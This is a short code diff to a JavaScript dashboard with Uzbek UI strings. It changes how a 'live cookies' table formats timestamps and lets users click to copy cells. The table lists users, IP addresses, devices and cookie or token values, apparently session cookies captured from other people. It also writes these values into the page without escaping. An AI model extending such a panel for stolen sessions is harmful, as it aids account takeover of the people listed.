@@ -623,19 +623,24 @@ async function loadLiveCookies() {
     const res = await api('/cookies/live');
     if (!res.success) return;
     document.getElementById('cookiesBody').innerHTML = res.cookies.map(c => {
-        // API dan kelayotgan ma'lumotlarni ehtimoliy nomlari bilan tutib olamiz
-        const time = c.vaqt || c.time || c.createdAt || c.timestamp || c.date || '-';
+        const time = c.vaqt || c.time || c.createdAt || c.updatedAt || c.timestamp || c.date || '-';
         const user = c.foydalanuvchi || c.user || c.username || c.name || '-';
         const team = c.team || '-';
         const ip = c.ip || c.ipAddress || '-';
         const device = c.qurilma || c.device || c.userAgent || 'Noma`lum';
         const cookieVal = c.cookie || c.value || c.token || '-';
         
-        const formatTime = time !== '-' ? new Date(time).toLocaleString('uz-UZ') : '-';
+        let formatTime = time;
+        if (time !== '-' && time.length > 10) {
+            try {
+                let d = new Date(time);
+                if (!isNaN(d.getTime())) formatTime = d.toLocaleString('uz-UZ');
+            } catch(e) {}
+        }
         
         return `
         <tr style="transition: all 0.2s;" onmouseover="this.style.backgroundColor='#2a3441'" onmouseout="this.style.backgroundColor='transparent'">
-            <td style="white-space: nowrap; font-size: 0.85em;">${formatTime}</td>
+            <td style="white-space: nowrap; font-size: 0.85em; cursor: pointer; color: #00E5FF;" onclick="navigator.clipboard.writeText(this.innerText); alert('Vaqt nusxalandi!')" title="Nusxalash uchun bosing">${formatTime}</td>
             
             <td style="font-weight: bold; color: #4A7FFF; cursor: pointer;" onclick="navigator.clipboard.writeText(this.innerText); alert('Ism nusxalandi!')" title="Nusxalash uchun bosing">${user}</td>
             
